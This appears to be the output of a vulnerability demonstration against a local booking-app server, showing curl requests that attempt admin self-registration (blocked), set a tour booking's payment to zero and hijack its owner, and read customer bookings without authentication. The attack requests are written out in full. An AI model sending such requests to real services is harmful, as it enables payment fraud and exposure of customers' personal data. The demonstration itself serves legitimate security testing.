
  V-13 — Insufficient server-side input validation
  Live demonstration against http://localhost:4055

────────────────────────────────────────────────────────────────
  ATTACK 1  Anyone can make themselves an administrator
────────────────────────────────────────────────────────────────

   The signup form in the browser only ever offers a business account.
   But the form is not what talks to the server — this is:

   What an attacker sends:

     curl -X POST http://localhost:4055/api/bussinessregister \
       -H "Content-Type: application/json" \
       -d '{"email":"viva-attacker-1790416685116@evil.com",
            "password":"password123",
            "role":"Admin",
            "fullName":"Attacker", "contact":"0771234567",
            "businessName":"Evil Co", "businessAddress":"x",
            "businessType":"hotel"}'

   What the database actually stored:

     role = (account was not created)

   Result: BLOCKED  — the request was rejected outright.

────────────────────────────────────────────────────────────────
  ATTACK 2  Anyone can set a booking price to zero
────────────────────────────────────────────────────────────────

   First, a normal booking is made through the system — a $349 tour.

     bookingID       = 6f6ec124-eb48-42c6-80ed-82bd35bd8e30
     payment_amount  = 349
     touristID       = real-customer-1790416685116

   Stripe charges whatever this record says. So the attacker edits it:

   What an attacker sends:

     curl -X PUT http://localhost:4055/api/Booking/6f6ec124-eb48-42c6-80ed-82bd35bd8e30 \
       -H "Content-Type: application/json" \
       -d '{"payment_amount": 0,
            "touristID": "attacker"}'

   What the database actually stored:

     payment_amount  = 0   (was 349)
     touristID       = attacker   (hijacked)

   Result: VULNERABLE
   A $349 tour can now be paid for with $0 — through real Stripe.

────────────────────────────────────────────────────────────────
  ATTACK 3  No login needed to read every customer booking
────────────────────────────────────────────────────────────────

   These endpoints had no authentication at all.

   What an attacker sends:

     curl http://localhost:4055/api/Booking     # no token, no password

   Server responded:  HTTP 200

   Result: VULNERABLE
   Returned 2 bookings — names, phone numbers, dates — to a stranger.

────────────────────────────────────────────────────────────────
    2 of 3 attacks SUCCEEDED — this code is vulnerable.
